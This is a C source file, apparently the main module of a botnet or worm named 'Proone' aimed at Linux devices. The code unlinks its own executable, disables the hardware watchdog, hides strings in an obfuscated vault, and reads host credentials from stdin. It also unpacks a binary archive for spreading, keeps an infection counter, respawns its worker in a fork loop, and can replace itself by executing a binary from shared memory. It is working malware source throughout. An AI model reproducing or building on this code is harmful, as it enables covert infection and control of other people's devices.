#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/wait.h>
#include <sys/random.h>

#include "proone.h"
#include "util_rt.h"
#include "dvault.h"
#include "heartbeat-worker.h"
#include "proone_conf/x509.h"


struct prne_global prne_g;
struct prne_shared_global *prne_s_g = NULL;


typedef struct {
    prne_worker_t worker;
    prne_worker_sched_req_t sched_req;
} worker_tuple_t;

typedef struct {
    struct pollfd *arr;
    size_t size;
} pollfd_pool_t;

static worker_tuple_t worker_pool[1];
static size_t worker_pool_size = 0;
static void (*proc_fin_call_ptr)(void) = NULL;
static bool finalising = false;
static pollfd_pool_t pollfd_pool;

static prne_rnd_engine_t *mk_rnd_engine (void);

static void proc_fin_call (void) {
    if (prne_g.caught_signal != 0) {
        size_t i;
        worker_tuple_t *wt;

        for (i = 0; i < worker_pool_size; i += 1) {
            wt = worker_pool + i;
            wt->worker.fin(wt->worker.ctx);
        }

        proc_fin_call_ptr = prne_empty_func;
        finalising = true;
    }
}

static int proone_main (void) {
    int exit_code = 0;
    size_t i;
    worker_tuple_t *wt;
    prne_worker_sched_info_t sched_info;

    prne_g.rnd = mk_rnd_engine();
    
    // done with the terminal
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

#ifndef PRNE_DEBUG
    signal(SIGPIPE, SIG_IGN);
#endif

    // init workers
    if (prne_alloc_heartbeat_worker(&worker_pool[worker_pool_size].worker)) {
        worker_pool_size += 1;
    }

    // TODO

    for (i = 0; i < worker_pool_size; i += 1) {
        prne_init_worker_sched_req(&worker_pool[i].sched_req, NULL);
    }

    if (worker_pool_size == 0 || prne_g.caught_signal != 0) {
        goto END;
    }

    proc_fin_call_ptr = proc_fin_call;

    prne_succeed_or_die(clock_gettime(CLOCK_MONOTONIC, &sched_info.last_tick));
    pollfd_pool.arr = NULL;
    pollfd_pool.size = 0;
    while (true) {
        prne_worker_sched_flag_t all_sched_flag = PRNE_WORKER_SCHED_FLAG_NONE;
        struct timespec timeout;
        size_t total_pollfd_size = 0;
        bool worked = false;

        prne_succeed_or_die(clock_gettime(CLOCK_MONOTONIC, &sched_info.this_tick));
        sched_info.tick_diff = prne_sub_timespec(&sched_info.this_tick, &sched_info.last_tick);
        sched_info.real_tick_diff = prne_real_timespec(&sched_info.tick_diff);

        proc_fin_call_ptr();
        
        for (i = 0; i < worker_pool_size; i += 1) {
            wt = worker_pool + i;

            if (wt->worker.has_finalised(wt->worker.ctx)) {
                continue;
            }

            wt->worker.work(wt->worker.ctx, &sched_info, &wt->sched_req);
            worked |= true;

            if (wt->sched_req.flags & PRNE_WORKER_SCHED_FLAG_TIMEOUT) {
                if (all_sched_flag & PRNE_WORKER_SCHED_FLAG_TIMEOUT) {
                    if (prne_cmp_timespec(&timeout, &wt->sched_req.timeout) > 0) {
                        timeout = wt->sched_req.timeout;
                    }
                }
                else {
                    timeout = wt->sched_req.timeout;
                }
            }
            if (wt->sched_req.flags & PRNE_WORKER_SCHED_FLAG_POLL) {
                total_pollfd_size += wt->sched_req.pollfd_arr_size;
            }

            all_sched_flag |= wt->sched_req.flags;
        }

        sched_info.last_tick = sched_info.this_tick;

        if (!worked) {
            if (!finalising) {
                exit_code = 1;
            }
            break;
        }
        else if (all_sched_flag & PRNE_WORKER_SCHED_FLAG_POLL) {
            void *ny_mem;
            size_t pollfd_ptr;

            /* FIXME: `total_pollfd_size` could be zero if there's some bug in
            * one of the workers.
            */
            ny_mem = prne_realloc(pollfd_pool.arr, sizeof(struct pollfd), total_pollfd_size);
            if (ny_mem != NULL) {
                pollfd_pool.arr = (struct pollfd*)ny_mem;
                pollfd_pool.size = total_pollfd_size;

                pollfd_ptr = 0;
                for (i = 0; i < worker_pool_size; i += 1) {
                    wt = &worker_pool[i];

                    if (wt->worker.has_finalised(wt->worker.ctx)) {
                        continue;
                    }
                    
                    if (wt->sched_req.flags & PRNE_WORKER_SCHED_FLAG_POLL) {
                        wt->sched_req.pollfd_ready = false;
                        memcpy(pollfd_pool.arr + pollfd_ptr, wt->sched_req.pollfd_arr, wt->sched_req.pollfd_arr_size * sizeof(struct pollfd));
                        pollfd_ptr += wt->sched_req.pollfd_arr_size;
                    }
                }

                if (ppoll(pollfd_pool.arr, pollfd_pool.size, all_sched_flag & PRNE_WORKER_SCHED_FLAG_TIMEOUT ? &timeout : NULL, NULL) < 0) {
                    switch (errno) {
                    case EINTR:
                    case ENOMEM:
                        break;
                    default:
                        abort();
                    }
                }
                else {
                    pollfd_ptr = 0;
                    for (i = 0; i < worker_pool_size; i += 1) {
                        wt = &worker_pool[i];

                        if (wt->worker.has_finalised(wt->worker.ctx)) {
                            continue;
                        }

                        if (wt->sched_req.flags & PRNE_WORKER_SCHED_FLAG_POLL) {
                            wt->sched_req.pollfd_ready = true;
                            memcpy(wt->sched_req.pollfd_arr, pollfd_pool.arr + pollfd_ptr, wt->sched_req.pollfd_arr_size);
                            pollfd_ptr += wt->sched_req.pollfd_arr_size;
                        }
                    }
                }
            }
        }
        else if (all_sched_flag & PRNE_WORKER_SCHED_FLAG_TIMEOUT) {
            if (nanosleep(&timeout, NULL) < 0 && errno != EINTR) {
                abort();
            }
        }
    }

END:
    prne_free(pollfd_pool.arr);
    pollfd_pool.arr = NULL;
    pollfd_pool.size = 0;

    for (i = 0; i < worker_pool_size; i += 1) {
        wt = &worker_pool[i];
        wt->worker.free(wt->worker.ctx);
        wt->sched_req.mem_func.free(&wt->sched_req);
    }

    prne_free_rnd_engine(prne_g.rnd);
    prne_g.rnd = NULL;

    return exit_code;
}

static bool ensure_single_instance (void) {
    prne_g.lock_shm_fd = shm_open(
        prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL),
        O_RDWR | O_CREAT | O_TRUNC,
        0666);
    prne_dvault_reset_dict();
    if (prne_g.lock_shm_fd < 0) {
        return true;
    }

    if (flock(prne_g.lock_shm_fd, LOCK_EX | LOCK_NB) < 0) {
        close(prne_g.lock_shm_fd);
        prne_g.lock_shm_fd = -1;

        return false;
    }

    return true;
}

static void delete_myself (const char *arg0) {
#ifndef PRNE_DEBUG
    static const char *proc_path = "/proc/self/exe";
    struct stat st;
    const char *path_to_unlink = NULL;
    char *path_buf = NULL;    
    
    // get real path of myself
    if (lstat(proc_path, &st) == 0 && (path_buf = (char*)prne_malloc(1, st.st_size + 1)) != NULL && readlink(proc_path, path_buf, st.st_size) == st.st_size) {
        path_buf[st.st_size] = 0;
        path_to_unlink = path_buf;
    }
    else {
        // try to delete arg0 instead
        path_to_unlink = arg0;
    }

    unlink(path_to_unlink);
    prne_free(path_buf);
#endif
}

static void disasble_watchdog (void) {
#ifndef PRNE_DEBUG
    static const char *watchdog_paths[] = {
        "/dev/watchdog",
        "/dev/misc/watchdog"
    };
    static const int one = 1;
    int fd;
    size_t i;

    for (i = 0; i < sizeof(watchdog_paths) / sizeof(const char*); i += 1) {
        if ((fd = open(watchdog_paths[i], O_RDWR)) >= 0) {
            ioctl(fd, 0x80045704, &one);
            close(fd);
            break;
        }
    }
#endif
}

static void handle_interrupt (const int sig) {
    prne_g.caught_signal = sig;

    if (prne_g.proone_pid != 0) {
        kill(prne_g.proone_pid, sig);
    }
}

static void setup_signal_actions (void) {
    struct sigaction sa;

    sa.sa_handler = handle_interrupt;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESETHAND;

    // try to exit gracefully upon reception of these signals
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
}

static void print_ready_signature (prne_rnd_engine_t *rnd) {
    size_t len;
    uint8_t *sig_data;
    char *plain_str, *sig_str;
    
    plain_str = prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_SIGN_INIT_OK, &len);

    sig_data = (uint8_t*)prne_malloc(1, len + 1);
    sig_data[0] = (uint8_t)(prne_rnd_gen_int(rnd) % 256);
    memcpy(sig_data + 1, plain_str, len);
    prne_dvault_reset_dict();
    prne_dvault_invert_mem(len, sig_data + 1, sig_data[0]);

    sig_str = prne_enc_base64_mem(sig_data, len);
    if (sig_str == NULL) {
        abort();
    }

    puts(sig_str);

    prne_free(sig_str);
    prne_free(sig_data);
}

static void read_host_credential (void) {
    static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3;
    char *buf = (char*)prne_malloc(1, buf_size);
    size_t i;
    bool found = false;

    for (i = 0; i < buf_size; i += 1) {
        if (read(STDIN_FILENO, &buf[i], 1) != 1) {
            goto END;
        }

        if (buf[i] == '\n') {
            found = true;
            break;
        }
    }
    if (found) {
        prne_dec_base64_mem(buf, i, &prne_g.host_cred_data, &prne_g.host_cred_size);
    }

END:
    prne_free(buf);
}

static void set_env (void) {
    // environment set up function calls in here
}

static void create_ny_bin_shm (prne_rnd_engine_t *rnd) {
    const size_t str_len = 1 + 10;

    prne_g.ny_bin_shm_name = prne_malloc(1, str_len + 1);
    if (prne_g.ny_bin_shm_name == NULL) {
        return;
    }

    prne_g.ny_bin_shm_name[0] = '/';
    prne_g.ny_bin_shm_name[str_len] = 0;
    prne_rnd_anum_str(rnd, prne_g.ny_bin_shm_name + 1, str_len - 1);
    
    prne_g.ny_bin_shm_fd = shm_open(prne_g.ny_bin_shm_name, O_RDWR | O_CREAT | O_TRUNC, 0000);
    if (prne_g.ny_bin_shm_fd < 0) {
        prne_free(prne_g.ny_bin_shm_name);
        prne_g.ny_bin_shm_name = NULL;
    }
}

static void exec_ny_bin (void) {
    // Just die on error
    static const size_t proc_fd_path_size = 14 + 11 + 1;
    uint8_t *data, *bin = NULL;
    size_t i, args_size, bin_size, argc = 0, cnt;
    char *arg_str;
    const char **args;
    struct stat st;
    char *proc_fd_path;
    char *real_shm_path;

    if (prne_g.ny_bin_shm_fd < 0) {
        return;
    }

    if (fstat(prne_g.ny_bin_shm_fd, &st) < 0 || st.st_size < 0) {
        abort();
    }
    if (st.st_size == 0) {
        if (prne_s_g->has_ny_bin) {
            abort();
        }
        return;
    }
    data = (uint8_t*)mmap(NULL, (size_t)st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, prne_g.ny_bin_shm_fd, 0);
    for (i = 1; i <= (size_t)st.st_size; i += 1) {
        if (data[st.st_size - i] == 0) {
            bin = &data[st.st_size - i + 1];
            break;
        }
    }

    if (bin == NULL) {
        abort();
    }
    args_size = bin - data;
    bin_size = st.st_size - args_size;
    arg_str = prne_malloc(1, args_size);
    memcpy(arg_str, data, args_size);

    memmove(bin, data, bin_size);

    munmap(data, (size_t)st.st_size);
    data = NULL;
    ftruncate(prne_g.ny_bin_shm_fd, bin_size);

    for (i = 0; i < args_size; i += 1) {
        if (arg_str[i] == 0) {
            argc += 1;
        }
    }
    args = prne_malloc(sizeof(const char*), argc + 1);
    cnt = 1;
    for(i = 1; cnt < argc; i += 1) {
        if (arg_str[i] == 0) {
            args[cnt] = &arg_str[i + 1];
            cnt += 1;
        }
    }
    args[argc] = NULL;

    proc_fd_path = prne_malloc(1, proc_fd_path_size);
    snprintf(proc_fd_path, proc_fd_path_size, "/proc/self/fd/%d", prne_g.ny_bin_shm_fd);
    if (lstat(proc_fd_path, &st) < 0) {
        abort();
    }

    real_shm_path = prne_malloc(1, st.st_size + 1);
    if (readlink(proc_fd_path, real_shm_path, st.st_size) != st.st_size) {
        abort();
    }
    
    fchmod(prne_g.ny_bin_shm_fd, 0777);
    close(prne_g.ny_bin_shm_fd);
    prne_g.ny_bin_shm_fd = -1;

    args[0] = proc_fd_path;
    if (execv(real_shm_path, (char *const*)args) < 0) {
        abort();
    }
}

static void init_ssl (void) {
    if (mbedtls_x509_crt_parse(&prne_g.ca, (const uint8_t*)PRNE_X509_CA_CRT, sizeof(PRNE_X509_CA_CRT) - 1) != 0) {
        return;
    }

    prne_g.s_ssl_ready =
        mbedtls_ssl_config_defaults(&prne_g.s_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
        mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, (const uint8_t*)PRNE_X509_S_CRT, sizeof(PRNE_X509_S_CRT) - 1) == 0 &&
        mbedtls_pk_parse_key(&prne_g.s_ssl.pk, (const uint8_t*)PRNE_X509_S_KEY, sizeof(PRNE_X509_S_KEY) - 1, NULL, 0) == 0 &&
        mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, (const uint8_t*)PRNE_X509_DH, sizeof(PRNE_X509_DH) - 1) == 0 &&
        mbedtls_ssl_conf_own_cert(&prne_g.s_ssl.conf, &prne_g.s_ssl.crt, &prne_g.s_ssl.pk) == 0 &&
        mbedtls_ssl_conf_dh_param_ctx(&prne_g.s_ssl.conf, &prne_g.s_ssl.dhm) == 0;
    if (prne_g.s_ssl_ready) {
        mbedtls_ssl_conf_ca_chain(&prne_g.s_ssl.conf, &prne_g.ca, NULL);
    }

    prne_g.c_ssl_ready =
        mbedtls_ssl_config_defaults(&prne_g.c_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
        mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, (const uint8_t*)PRNE_X509_C_CRT, sizeof(PRNE_X509_C_CRT) - 1) == 0 &&
        mbedtls_pk_parse_key(&prne_g.c_ssl.pk, (const uint8_t*)PRNE_X509_C_KEY, sizeof(PRNE_X509_C_KEY) - 1, NULL, 0) == 0 &&
        mbedtls_ssl_conf_own_cert(&prne_g.c_ssl.conf, &prne_g.c_ssl.crt, &prne_g.c_ssl.pk) == 0;
    if (prne_g.c_ssl_ready) {
        mbedtls_ssl_conf_ca_chain(&prne_g.c_ssl.conf, &prne_g.ca, NULL);
    }
}

static void init_shared_global (prne_rnd_engine_t *rnd) {
    // just die on error
    const size_t str_len = 1 + 10;
    int fd;
    char *name;

    name = prne_malloc(1, str_len + 1);
    name[0] = '/';
    name[str_len] = 0;
    prne_rnd_anum_str(rnd, name + 1, str_len - 1);
    
    fd = shm_open(name, O_RDWR | O_CREAT | O_TRUNC, 0000);
    if (fd < 0) {
        abort();
    }
    shm_unlink(name);
    prne_free(name);

    if (ftruncate(fd, sizeof(struct prne_shared_global)) < 0) {
        abort();
    }
    prne_s_g = (struct prne_shared_global*)mmap(NULL, sizeof(struct prne_shared_global), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (prne_s_g == NULL) {
        abort();
    }
    close(fd);

    prne_s_g->bne_cnt = 0;
    prne_s_g->infect_cnt = 0;
    prne_s_g->has_ny_bin = false;    
}


int main (const int argc, char **args) {
    int exit_code = 0;
    prne_rnd_engine_t *rnd = NULL;

    prne_g.host_cred_data = NULL;
    prne_g.host_cred_size = 0;
    prne_g.ny_bin_shm_name = NULL;
    prne_g.rnd = NULL;
    memset(&prne_g.god_start, 0, sizeof(struct timespec));
    prne_g.run_cnt = 0;
    prne_g.caught_signal = 0;
    prne_g.god_pid = getpid();
    prne_g.proone_pid = 0;
    prne_g.lock_shm_fd = -1;
    prne_g.ny_bin_shm_fd = -1;
    prne_g.bin_ready = false;
    prne_init_unpack_bin_archive_result(&prne_g.bin_pack);
    prne_init_bin_archive(&prne_g.bin_archive);
    mbedtls_x509_crt_init(&prne_g.ca);
    mbedtls_ssl_config_init(&prne_g.s_ssl.conf);
    mbedtls_x509_crt_init(&prne_g.s_ssl.crt);
    mbedtls_pk_init(&prne_g.s_ssl.pk);
    mbedtls_dhm_init(&prne_g.s_ssl.dhm);
    prne_g.s_ssl_ready = false;
    mbedtls_ssl_config_init(&prne_g.c_ssl.conf);
    mbedtls_x509_crt_init(&prne_g.c_ssl.crt);
    mbedtls_pk_init(&prne_g.c_ssl.pk);
    prne_g.c_ssl_ready = false;

    // inits that need no outside resources
    prne_init_dvault();
    init_ssl();
    set_env();

    /* inits that need outside resources. IN THIS ORDER! */
    if (!ensure_single_instance()) {
        exit_code = 1;
        goto END;
    }
    rnd = mk_rnd_engine();
    init_shared_global(rnd);
    create_ny_bin_shm(rnd);
    delete_myself(args[0]);
    disasble_watchdog();

    print_ready_signature(rnd);
    read_host_credential();
    // get fed with the bin archive
    prne_g.bin_pack = prne_unpack_bin_archive(STDIN_FILENO);
    if (prne_g.bin_pack.result == PRNE_UNPACK_BIN_ARCHIVE_OK) {
        prne_g.bin_ready = prne_index_bin_archive(&prne_g.bin_pack, &prne_g.bin_archive) == PRNE_INDEX_BIN_ARCHIVE_OK;
    }

    setup_signal_actions();

    prne_succeed_or_die(clock_gettime(CLOCK_MONOTONIC, &prne_g.god_start));

    // main loop
    while (prne_g.caught_signal == 0) {
        prne_g.proone_pid = fork();

        if (prne_g.proone_pid >= 0) {
            prne_g.run_cnt += 1;
        }

        if (prne_g.proone_pid < 0) {
            sleep(1);
        }
        else if (prne_g.proone_pid > 0) {
            int status;

            while (prne_g.caught_signal == 0) {
                if (waitpid(prne_g.proone_pid, &status, 0) < 0) {
                    if (errno != EINTR) {
                        abort();
                    }
                    else {
                        continue;
                    }
                }

                prne_g.proone_pid = 0;
                break;
            }

            if (!WIFEXITED(status)) {
                sleep(3);
                continue;
            }
            if (WEXITSTATUS(status) == 0) {
                break;
            }
        }
        else {
            prne_free(prne_g.ny_bin_shm_name);
            close(prne_g.lock_shm_fd);
            prne_g.lock_shm_fd = -1;
            prne_g.ny_bin_shm_name = NULL;
        
            exit_code = proone_main();
            break;
        }
    }

END:
    prne_free_bin_archive(&prne_g.bin_archive);
    prne_free_unpack_bin_archive_result(&prne_g.bin_pack);
    prne_g.bin_ready = false;
    
    mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
    mbedtls_x509_crt_free(&prne_g.s_ssl.crt);
    mbedtls_pk_free(&prne_g.s_ssl.pk);
    mbedtls_dhm_free(&prne_g.s_ssl.dhm);
    prne_g.s_ssl_ready = false;
    mbedtls_ssl_config_free(&prne_g.c_ssl.conf);
    mbedtls_x509_crt_free(&prne_g.c_ssl.crt);
    mbedtls_pk_free(&prne_g.c_ssl.pk);
    prne_g.c_ssl_ready = false;
    mbedtls_x509_crt_free(&prne_g.ca);

    prne_free(prne_g.host_cred_data);
    prne_g.host_cred_data = NULL;
    prne_g.host_cred_size = 0;

    if (prne_g.lock_shm_fd >= 0) {
        shm_unlink(prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL));
        prne_dvault_reset_dict();
        close(prne_g.lock_shm_fd);
        prne_g.lock_shm_fd = -1;
    }

    prne_deinit_dvault();

    prne_free_rnd_engine(rnd);
    rnd = NULL;


    if (prne_s_g->has_ny_bin) {
        exec_ny_bin();
    }
    
    if (prne_g.ny_bin_shm_name != NULL) {
        shm_unlink(prne_g.ny_bin_shm_name);
        prne_free(prne_g.ny_bin_shm_name);
    }
    close(prne_g.ny_bin_shm_fd);
    prne_g.ny_bin_shm_name = NULL;
    prne_g.ny_bin_shm_fd = -1;

    return exit_code;
}

static prne_rnd_engine_t *mk_rnd_engine (void) {
    uint32_t seed = 0;
    prne_rnd_engnie_alloc_result_t ret;

    getrandom(&seed, sizeof(uint32_t), 0);

    if (seed == 0) {
        // fall back to seeding with what's available.
        seed =
            (uint32_t)(time(NULL) % 0xFFFFFFFF) ^
            (uint32_t)(getpid() % 0xFFFFFFFF) ^
            (uint32_t)(getppid() % 0xFFFFFFFF) ^
            (uint32_t)(clock() % 0xFFFFFFFF);
    }
    
    ret = prne_alloc_rnd_engine(seed == 0 ? NULL : &seed);
    if (ret.result != PRNE_RND_ENGINE_ALLOC_OK) {
        abort();
    }

    return ret.engine;
}
